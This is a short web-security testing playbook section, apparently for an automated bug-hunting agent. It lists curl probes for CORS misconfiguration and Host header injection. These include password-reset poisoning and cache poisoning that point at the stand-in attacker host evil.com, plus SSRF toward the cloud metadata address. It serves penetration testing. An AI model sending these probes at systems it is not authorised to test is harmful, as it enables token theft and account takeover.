# ZDH Phase 14: CORS & Host Header Injection

## Phase 14 - CORS & Host Header Injection

```bash
# CORS misconfiguration test
# 1. Origin reflection (any origin gets credentials?)
curl -s "https://api.<target>/user/profile" \
  -H "Origin: https://evil.com" \
  -H "Cookie: <session>" -I
# Vulnerable: "Access-Control-Allow-Origin: https://evil.com" + "Access-Control-Allow-Credentials: true"
# Exploit: attacker site makes authenticated request on victim's behalf

# 2. Null origin (from sandboxed iframe)
curl -s "https://api.<target>/user/profile" \
  -H "Origin: null" \
  -H "Cookie: <session>" -I
# Vulnerable: "Access-Control-Allow-Origin: null"

# 3. Trusted subdomain with XSS (chain CORS + XSS)
# If cors allows *.target.com and you find XSS on sub.target.com -> steal data

# Host header injection
# 1. Password reset poisoning
POST /forgot-password  {"email": "victim@example.com"}
-H "Host: evil.com"
# If reset link is "https://evil.com/reset?token=X" -> you receive the token

# 2. Web cache poisoning via Host header
curl "https://<target>/" -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"
# If host value reflected in page (e.g., in meta tags, links) -> cache poison

# 3. SSRF via Host header
-H "Host: 169.254.169.254"  # some reverse proxies forward Host as destination
```

**Signal:** `emit_signal VULN_CONFIRMED "CORS misconfiguration: origin reflection with credentials on <endpoint>" "main/zerodayhunt" 0.88`
